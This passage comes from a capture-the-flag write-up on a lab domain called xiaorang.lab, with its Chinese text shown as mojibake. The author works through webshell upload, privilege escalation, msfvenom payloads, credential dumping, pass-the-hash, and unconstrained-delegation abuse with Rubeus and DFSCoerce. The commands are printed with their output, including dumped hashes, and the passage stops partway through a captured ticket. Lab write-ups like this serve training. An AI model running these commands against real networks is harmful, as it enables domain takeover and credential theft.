â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-04-17 22:29:55] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-04-17 22:29:55] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-04-17 22:29:55] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1\n[2025-04-17 22:29:55] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-04-17 22:29:55] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\n[2025-04-17 22:29:56] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.130.13:22\n[2025-04-17 22:29:56] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.130.13:21\n[2025-04-17 22:29:56] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.130.13:3306\n[2025-04-17 22:29:56] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.130.13:80\n[2025-04-17 22:29:56] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.130.13:22 => [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.5 äº§å“:OpenSSH ç³»ç»Ÿ:Linux  ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-04-17 22:29:56] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.130.13:21 => [ftp] ç‰ˆæœ¬:3.0.3 äº§å“:vsftpd ç³»ç»Ÿ:Unix Banner:[220 (vsFTPd 3.0.3).]\n[2025-04-17 22:30:01] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.130.13:3306 => [mysql] ç‰ˆæœ¬:8.0.29-0ubuntu0.20.04.3 äº§å“:MySQL\n[2025-04-17 22:30:01] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.130.13:80 => [http]\n[2025-04-17 22:30:04] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 4\n[2025-04-17 22:30:04] [INFO] å¼€å§‹æ¼æ´æ‰«æ\n[2025-04-17 22:30:04] [INFO] åŠ è½½çš„æ’ä»¶: ftp, mysql, ssh, webpoc, webtitle\n[2025-04-17 22:30:05] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.99.130.13       çŠ¶æ€ç :200 é•¿åº¦:68104  æ ‡é¢˜:ä¸­æ–‡ç½‘é¡µæ ‡é¢˜\n~~~\n\n80ç«¯å£æ˜¯cmseasy,urlåé¢æ‹¼æ¥/adminç‰ˆæœ¬å·æ˜¯v7752,åœ¨ç½‘ä¸Šå¯ä»¥æŸ¥åˆ°æ¼æ´\n\nhttps://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/\n\néƒ½éœ€è¦ç™»å½•åå°ï¼Œå¼±å£ä»¤admin:123456ç™»å½•æˆåŠŸäº†\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation1.png)\n\nå‘åŒ…ç„¶åå»è®¿é—®1.phpå¯ä»¥å‘ç°å†™å…¥æˆåŠŸäº†ï¼Œå†™ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åèšå‰‘è¿æ¥\n\nflagåœ¨/home/flag/ä¸‹ï¼Œä½†æ˜¯åªæœ‰rootèƒ½æŸ¥çœ‹ï¼Œåå¼¹ä¸€ä¸ªshellå‡†å¤‡ææƒ\n\n~~~\nwww-data@localhost:/var/www/html$ find / -perm -u=s 2>/dev/null\nfind / -perm -u=s 2>/dev/null\n\n/usr/bin/stapbpf\n/usr/bin/gpasswd\n/usr/bin/chfn\n/usr/bin/su\n/usr/bin/chsh\n/usr/bin/staprun\n/usr/bin/at\n/usr/bin/diff\n/usr/bin/fusermount\n/usr/bin/sudo\n/usr/bin/mount\n/usr/bin/newgrp\n/usr/bin/umount\n/usr/bin/passwd\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n~~~\n\nå¯ä»¥çœ‹åˆ°diffå…·æœ‰suidæƒé™ï¼Œå¯ä»¥è¯»å–flag01.txt\n\n# FLAG2\n\nè¿˜ç»™äº†ä¸€ä¸ªhint\n\n~~~\nGreat job!!!!!!\nHere is the hint: WIN19\\Adrian\nI'll do whatever I can to rock you...\n~~~\n\nä¸Šä¼ ä¸€ä¸ªfscanå…ˆæ‰«ï¼Œç„¶ååšä¸€ä¸ªä»£ç†éš§é“\n\n~~~\nwww-data@localhost:/tmp$ ./fscan -h 172.22.4.36/24\n./fscan -h 172.22.4.36/24\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     ___  ___ _ __ __ _  ___| | __    â”‚\nâ”‚  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-04-18 11:04:32] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-04-18 11:04:32] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-04-18 11:04:32] [INFO] CIDRèŒƒå›´: 172.22.4.0-172.22.4.255\n[2025-04-18 11:04:32] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.4.0.%!d(string=172.22.4.255) - %!s(MISSING).%!d(MISSING)\n[2025-04-18 11:04:32] [INFO] è§£æCIDR 172.22.4.36/24 -> IPèŒƒå›´ 172.22.4.0-172.22.4.255\n[2025-04-18 11:04:33] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256\n[2025-04-18 11:04:33] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-04-18 11:04:33] [INFO] æ­£åœ¨å°è¯•æ— ç›‘å¬ICMPæ¢æµ‹...\n[2025-04-18 11:04:33] [INFO] å½“å‰ç”¨æˆ·æƒé™ä¸è¶³,æ— æ³•å‘é€ICMPåŒ…\n[2025-04-18 11:04:33] [INFO] åˆ‡æ¢ä¸ºPINGæ–¹å¼æ¢æµ‹...\n[2025-04-18 11:04:33] [SUCCESS] ç›®æ ‡ 172.22.4.7      å­˜æ´» (ICMP)\n[2025-04-18 11:04:33] [SUCCESS] ç›®æ ‡ 172.22.4.36     å­˜æ´» (ICMP)\n[2025-04-18 11:04:33] [SUCCESS] ç›®æ ‡ 172.22.4.45     å­˜æ´» (ICMP)\n[2025-04-18 11:04:33] [SUCCESS] ç›®æ ‡ 172.22.4.19     å­˜æ´» (ICMP)\n[2025-04-18 11:04:39] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4\n[2025-04-18 11:04:39] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\n[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.45:80\n[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.36:80\n[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.7:135\n[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.45:139\n[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.19:135\n[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.7:139\n[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.45:135\n[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.19:139\n[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.7:389\n[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.7:445\n[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.36:22\n[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.36:21\n[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.19:445\n[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.45:445\n[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.7:88\n[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.36:3306\n[2025-04-18 11:04:39] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.36:22 => [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.5 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-04-18 11:04:40] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.36:21 => [ftp] ç‰ˆæœ¬:3.0.3 äº§å“:vsftpd ç³»ç»Ÿ:Unix Banner:[220 (vsFTPd 3.0.3).]\n[2025-04-18 11:04:40] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.36:3306 => [mysql] ç‰ˆæœ¬:8.0.29-0ubuntu0.20.04.3 äº§å“:MySQL Banner:[[.8.0.29-0ubuntu0.20.04.3 @.uoo ^_Z.Q.8Db#X \\>; caching_sha2_password]\n[2025-04-18 11:04:44] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.45:80 => [http]\n[2025-04-18 11:04:44] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.45:139 =>  Banner:[.]\n[2025-04-18 11:04:44] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.7:139 =>  Banner:[.]\n[2025-04-18 11:04:44] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.19:139 =>  Banner:[.]\n[2025-04-18 11:04:44] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.7:389 => [ldap] äº§å“:Microsoft Windows Active Directory LDAP ç³»ç»Ÿ:Windows ä¿¡æ¯:Domain: xiaorang.lab, Site: Default-First-Site-Name\n[2025-04-18 11:04:44] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.7:445 => \n[2025-04-18 11:04:45] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.19:445 => \n[2025-04-18 11:04:45] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.45:445 => \n[2025-04-18 11:04:45] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.7:88 => \n[2025-04-18 11:04:48] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.36:80 => [http]\n[2025-04-18 11:05:44] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.7:135 => \n[2025-04-18 11:05:44] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.19:135 => \n[2025-04-18 11:05:44] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.45:135 => \n[2025-04-18 11:05:44] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 16\n[2025-04-18 11:05:44] [INFO] å¼€å§‹æ¼æ´æ‰«æ\n[2025-04-18 11:05:44] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ftp, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle\n[2025-04-18 11:05:44] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 172.22.4.45\nä¸»æœºå: WIN19\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4åœ°å€:\n      â””â”€ 172.22.4.45\n[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.45     XIAORANG\\WIN19                \n[2025-04-18 11:05:45] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.4.45        çŠ¶æ€ç :200 é•¿åº¦:703    æ ‡é¢˜:IIS Windows Server\n[2025-04-18 11:05:45] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 172.22.4.7\nä¸»æœºå: DC01\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4åœ°å€:\n      â””â”€ 172.22.4.7\n[2025-04-18 11:05:45] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 172.22.4.19\nä¸»æœºå: FILESERVER\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4åœ°å€:\n      â””â”€ 172.22.4.19\n[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.7      DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393\n[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393\n[2025-04-18 11:05:45] [INFO] ç³»ç»Ÿä¿¡æ¯ 172.22.4.7 [Windows Server 2016 Datacenter 14393]\n[2025-04-18 11:05:45] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.4.36        çŠ¶æ€ç :200 é•¿åº¦:68100  æ ‡é¢˜:ä¸­æ–‡ç½‘é¡µæ ‡é¢˜\n\n~~~\n\nä¸Šé¢çš„flag1ç»™äº†ä¸ªæç¤ºåœ¨WIN19é‚£å°æœºå™¨ä¸Šå­˜åœ¨ä¸€ä¸ªAdrianç”¨æˆ·ï¼Œå¯†ç åœ¨rockyoué‡Œ\n\n~~~\nSMB         172.22.4.45     445    WIN19            [-] WIN19\\Adrian:babygirl1 STATUS_PASSWORD_EXPIRED\n~~~\n\nè¿˜æ˜¯å¾—çœ¼å°–ä¸€ç‚¹ï¼Œå¯†ç è¿‡æœŸä»–ä¸ä¼šå‘Šè¯‰ä½ ï¼Œrdpç™»å½•ä¿®æ”¹å¯†ç \n\n~~~\nrdesktop 172.22.4.45\n~~~\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation2.png)\n\næ¡Œé¢ä¸Šæœ‰ä¸€ä¸ªPrivescCheckæ–‡ä»¶å¤¹ï¼ŒPrivescCheckæ˜¯ä¸€ä¸ªææƒçš„å·¥å…·ï¼Œä»–è·‘å®Œäº†ç•™ä¸‹ä¸€ä¸ªhtmlæ–‡ä»¶ï¼Œç›´æ¥è®¿é—®å°±è¡Œ\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation3.png)\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation4.png)\n\nç»™äº†ä¸¤ä¸ªhighï¼Œç¬¬ä¸€ä¸ªWSUS æ›´å¤šçš„æ˜¯è¢«åˆ©ç”¨æ¥æ¨ªå‘ç§»åŠ¨,ç¬¬äºŒä¸ªæ³¨å†Œè¡¨ï¼Œç”¨æˆ·å¯¹gpupdateå…·æœ‰å†™ã€å¯åŠ¨ã€åœæ­¢çš„çš„æƒé™\n\nç”¨msfç”Ÿæˆä¸€ä¸ªæ­£å‘çš„æœ¨é©¬\n\n~~~\nmsfvenom -p windows/x64/meterpreter/bind_tcp LPORT=9999 -f exe -o bind.exe\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/bind_tcp\nset LPORT 9999\nset RHOST 172.22.4.45\nrun\n~~~\n\nå°†é©¬ä¸Šä¼ ä¸Šå»ç„¶åä¿®æ”¹ä¸€ä¸‹æ³¨å†Œè¡¨æ‰‹åŠ¨å¯åŠ¨æœåŠ¡\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation5.png)\n\n~~~\nsc start gupdate\n~~~\n\nä½†æ˜¯è¿™ä¸ªshellå¾ˆå¿«å°±ä¼šæ–­å¼€ï¼Œæ‰€ä»¥è¦è¿ç§»åˆ°å¦ä¸€ä¸ªè¿›ç¨‹ä¸­\n\n~~~\nps\nmigrate PID\n~~~\n\nä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘çš„msf shellå¯åŠ¨ä¸èµ·æ¥ï¼Œå¯¼å‡ºhash\n\n~~~\nload kiwi\ncreds_all\nmeterpreter > creds_all\n[+] Running as SYSTEM\n[*] Retrieving all credentials\nmsv credentials\n===============\n\nUsername  Domain    NTLM                              SHA1\n--------  ------    ----                              ----\nAdrian    WIN19     4ba5d16eb261eb61148ab5264f457cbb  9a712bd84b09123d36da74d9d5ac255c027588eb\nWIN19$    XIAORANG  d41fef724adf6f2ed2cbb5a4ebd186c9  af156e5c6afc93b1a648040bd59f7d5cab23d81a\nWIN19$    XIAORANG  5943c35371c96f19bda7b8e67d041727  5a4dc280e89974fdec8cf1b2b76399d26f39b8f8\n\nwdigest credentials\n===================\n\nUsername  Domain    Password\n--------  ------    --------\n(null)    (null)    (null)\nAdrian    WIN19     (null)\nWIN19$    XIAORANG  (null)\n\nkerberos credentials\n====================\n\nUsername  Domain        Password\n--------  ------        --------\n(null)    (null)        (null)\nAdrian    WIN19         (null)\nWIN19$    xiaorang.lab  ab 04 9b b9 d9 60 00 27 6b a0 0c 12 eb 66 73 a5 28 ef 5c 0e c3 89 fa c2 4b f8 67 35 a9 25\n                         75 bd c0 62 20 be d1 58 31 0b d1 5b 0e 15 41 4f c6 c6 4f 10 43 c8 cf a4 66 b8 0b 5c e8 4\n                        5 dd 12 e9 f9 8b 47 4c e1 6d cb 52 e1 5f 97 c3 73 1b 79 89 ca 8d 4c bf 42 47 4b 69 91 16\n                        9e 01 e2 78 36 07 fe 11 3b 1f f0 0a 12 6a d7 d8 b1 71 de 2e bd 75 84 c7 00 fa 3b 7c 7f 9a\n                         75 85 e8 93 23 ae 41 64 34 7d da 85 3a 5e 61 72 a4 5d 39 57 4b 1e ab 81 a7 02 ef ac 6c 6\n                        1 af 28 2a ee ab 34 ce 1e 00 d3 f7 89 d7 fd 40 29 ce 0c e2 c3 d1 fa d8 9f df d2 3d 7e 9d\n                        d8 05 77 70 60 3c 7d a6 d3 83 a7 e2 bf b0 a2 c7 57 97 d0 d3 ab c0 ee cb e2 b7 3d e7 a6 5d\n                         fd de 51 0c f2 69 d1 58 af ee 8d d1 c0 a3 14 ab 09 c8 9d db 37 e6 8e 62 b2 71 61 d6 2d 5\n                        c 57 a8\nWIN19$    xiaorang.lab  3a 94 de 4d 87 8e 7d 46 88 ec 9c 70 fd f0 c5 3e 4c f3 ce 6a 80 79 46 c6 2f f9 52 9b 4e 1d\n                         90 58 52 2a 4e ac bf 05 09 08 06 0c 4b a9 a2 aa a2 9d db 0d f8 09 82 c0 6e f4 1b 81 93 5\n                        9 67 54 de 17 82 d7 c3 82 c5 38 13 4f d0 55 98 f6 a2 cc e7 cb 85 84 35 8a 0c 2e 9f d1 90\n                        0c 0f c1 ea 0d d9 c5 d9 7f 29 a3 57 46 6b bf a4 b9 73 9a 80 84 1d df 3f 33 f5 16 e4 ee 2e\n                         d3 88 92 cd a5 6e ac e3 eb 71 43 ed 7c b8 a2 9e 52 d5 31 1c 50 9b c8 71 03 e1 8e 4f 60 5\n                        3 84 13 19 02 e2 8d 92 3f dc 0b 38 2c 13 c1 0e 6b 64 a7 fc 7a 2a a5 0e e0 b0 66 a9 a0 2f\n                        8d 8d 40 f8 72 d3 36 d3 3a a9 0d 3f b9 00 ef 3e 90 d9 36 a2 ad 36 2a 22 cd a0 cc 5b f4 0e\n                         a4 6b d3 24 8e 6e 99 59 96 d9 f8 a7 26 09 58 0a c2 3a 69 56 76 40 b9 10 92 a7 5c aa 3d e\n                        1 d0 1f\nwin19$    XIAORANG.LAB  ab 04 9b b9 d9 60 00 27 6b a0 0c 12 eb 66 73 a5 28 ef 5c 0e c3 89 fa c2 4b f8 67 35 a9 25\n                         75 bd c0 62 20 be d1 58 31 0b d1 5b 0e 15 41 4f c6 c6 4f 10 43 c8 cf a4 66 b8 0b 5c e8 4\n                        5 dd 12 e9 f9 8b 47 4c e1 6d cb 52 e1 5f 97 c3 73 1b 79 89 ca 8d 4c bf 42 47 4b 69 91 16\n                        9e 01 e2 78 36 07 fe 11 3b 1f f0 0a 12 6a d7 d8 b1 71 de 2e bd 75 84 c7 00 fa 3b 7c 7f 9a\n                         75 85 e8 93 23 ae 41 64 34 7d da 85 3a 5e 61 72 a4 5d 39 57 4b 1e ab 81 a7 02 ef ac 6c 6\n                        1 af 28 2a ee ab 34 ce 1e 00 d3 f7 89 d7 fd 40 29 ce 0c e2 c3 d1 fa d8 9f df d2 3d 7e 9d\n                        d8 05 77 70 60 3c 7d a6 d3 83 a7 e2 bf b0 a2 c7 57 97 d0 d3 ab c0 ee cb e2 b7 3d e7 a6 5d\n                         fd de 51 0c f2 69 d1 58 af ee 8d d1 c0 a3 14 ab 09 c8 9d db 37 e6 8e 62 b2 71 61 d6 2d 5\n                        c 57 a8\n\n\n~~~\n\nhashdump\n\n~~~\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::\nAdrian:1003:aad3b435b51404eeaad3b435b51404ee:4ba5d16eb261eb61148ab5264f457cbb:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44d8d68ed7968b02da0ebddafd2dd43e:::\n~~~\n\nç”¨Administratorç™»å½•\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# impacket-wmiexec  -hashes aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab Administrator@172.22.4.45\nC:\\>type C:\\Users\\Administrator\\flag\\flag02.txt\n~~~\n\n# FLAG3&FLAG4\n\næ·»åŠ ä¸€ä¸ªæ–°ç”¨æˆ·\n\n~~~\nnet user lv Asd123132 /add\nnet localgroup administrators lv /add\n~~~\n\næŸ¥çœ‹åŸŸå†…å§”æ´¾å…³ç³»\n\n~~~\nC:\\Users\\lv\\Desktop>Adinfo_win.exe -d=\"xiaorang.lab\" --dc=\"172.22.4.7\" -u=\"WIN19$\" -H=\"d41fef724adf6f2ed2cbb5a4ebd186c9\"\n\n           _____  _        __\n     /\\   |  __ \\(_)      / _|\n    /  \\  | |  | |_ _ __ | |_ ___\n   / /\\ \\ | |  | | | '_ \\|  _/ _ \\     Tools that collect information from domain\n  / ____ \\| |__| | | | | | || (_) |\n /_/    \\_\\_____/|_|_| |_|_| \\___/     v1.5 by lzz\n\n[i] Try to connect '172.22.4.7'\n[c] Auth Domain: xiaorang.lab\n[c] Auth user: WIN19$\n[c] Auth hash: d41fef724adf6f2ed2cbb5a4ebd186c9\n[c] connected successfully,try to dump domain info\n[i] DomainVersion found!\n                    [+] Windows 2016 Server operating system\n[i] Domain SID:\n                    [+] S-1-5-21-1913786442-1328635469-1954894845\n[i] Domain MAQ found\n                    [+] 10\n[i] Domain Account Policy found\n                    [+] pwdHistory: 24\n                    [+] minPwdLength: 7\n                    [+] minPwdAge: 1(day)\n                    [+] maxPwdAge: 42(day)\n                    [+] lockoutThreshold: 0\n                    [+] lockoutDuration: 30(min)\n[i] Domain Controllers: 1 found\n                    [+] DC01$  ==>>>   Windows Server 2016 Datacenter  [10.0 (14393)]  ==>>>  172.22.4.7\n[i] ADCS has not found!\n[i] Domain Exchange Server: 0 found\n[i] Domain All DNS:\n                    [+] Domain Dns 3 found,Saved in All_DNS.csv\n[i] Domain Trusts: 0 found\n[i] SPN: 39 found\n[i] Domain GPOs: 2 found\n[i] Domain Admins: 1 users found\n                    [+]Administrator\n[i] Enterprise Admins: 1 users found\n                    [+]Administrator\n[i] administrators: 1 users found\n                    [+]Administrator\n[i] Backup Operators: 0 users found\n[i] Users: 6 found\n[i] User with Mail: 0 found\n[i] Only_name_and_Useful_Users: 3 found\n[i] Only_admincount=1_andUseful_Users: 1 found\n[i] Locked Users: 0 found\n[i] Disabled Users: 3 found\n[i] Users with passwords not set to expire: 2 found\n[i] Domain Computers: 5 found\n[i] Only_name_and_Useful_computers: 5 found\n[i] Groups: 49 found\n[i] Domain OUs: 1 found\n[i] LAPS Not found\n[i] LAPS passwords: 0 found\n[i] SensitiveDelegate Users: 0 found\n[i] AsReproast Users: 0 found\n[i] Kerberoast Users: 1 found\n                    [+] CN=krbtgt,CN=Users,DC=xiaorang,DC=lab  ==>>>  kadmin/changepw\n[i] SIDHistory Users: 0 found\n[i] CreatorSID Users: 2 found\n                    [+] WIN-3X7U15C2XDM$  ==>>>  Marcus\n                    [+] WIN-YUUAW2QG9MF$  ==>>>  Marcus\n[i] RBCD Users: 0 found\n[i] Unconstrained Deligation Users: 1 found\n                    [+] WIN19$\n[i] Constrained Deligation Users: 0 found\n[i] Krbtgt password last set time: 2022-06-22 22:54:34 +0800 CST\n[i] CSVs written to 'csv' directory in C:\\Users\\lv\\Desktop\n[i] Execution took 1.0246743s\n~~~\n\n~~~\n[i] Unconstrained Deligation Users: 1 found\n                    [+] WIN19$\n~~~\n\nWIN19$æœ‰éçº¦æŸå§”æ´¾ï¼Œä¸Šä¼ Rubeusè¿›è¡Œç›‘å¬\n\n~~~\nRubeus.exe monitor /interval:1 /filteruser:DC01$\n~~~\n\n~~~\nC:\\Users\\lv\\Desktop>Rubeus.exe monitor /interval:1 /filteruser:DC01$\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.2.0\n\n[*] Action: TGT Monitoring\n[*] Target user     : DC01$\n[*] Monitoring every 1 seconds for new TGTs\n\n\n~~~\n\nç„¶åä½¿ç”¨dfscoerceè®©DSå‘WIN19$è®¤è¯\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# proxy -f proxychains4.conf -q python3 ../script/AD/dfscoerce.py -u \"WIN19$\" -hashes :d41fef724adf6f2ed2cbb5a4ebd186c9 -d xiaorang.lab WIN19 172.22.4.7\n[-] Connecting to ncacn_np:172.22.4.7[\\PIPE\\netdfs]\n[+] Successfully bound!\n[-] Sending NetrDfsRemoveStdRoot!\nNetrDfsRemoveStdRoot\nServerName:                      'WIN19\\x00'\nRootShare:                       'test\\x00'\nApiFlags:                        1\n\n\nDFSNM SessionError: code: 0x490 - ERROR_NOT_FOUND - Element not found.\n~~~\n\n~~~\nC:\\Users\\lvv\\Desktop>Rubeus.exe monitor /interval:1 /filteruser:DC01$\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.2.0\n\n[*] Action: TGT Monitoring\n[*] Target user     : DC01$\n[*] Monitoring every 1 seconds for new TGTs\n\n\n[*] 2025/4/18 4:54:32 UTC - Found new TGT:\n\n  User                  :  DC01$@XIAORANG.LAB\n  StartTime             :  2025/4/18 10:28:04\n  EndTime               :  2025/4/18 20:28:04\n  RenewTill             :  2025/4/25 10:28:04\n  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable\n  Base64EncodedTicket   :\n\n    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRn\n    dBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6F05kURrtAGLPwnEu0x0RxvAPS3m5aRx/bjVuGQLR7b0+L\n    x5X557jubFee2VfyECSf1RICTWkdJttbkCj4s6IMQrVpe8jFgy3Uki4NC0WdUfzH1nIiJSCq0lRPzgI88NGOrQEbDaurBzq150lY\n    i68ssuARb6DWCu6HYLjq66NSI53LNGAHqlNVoU+83ZOhJboPDjY2XL74OXFh0Qr57fWAbUOWegzVPHFicFshmeiMv111lfJr0X6Q\n    aqATuWtvoSsDI+/v3HyGMlqmlqJmmt0coW9z0L6V52yL7XA2YfXod7N+hWb/gclV5+C1G7GNj/uM3Zi5DyJ9kk+IuWHKWRRrz7JR\n    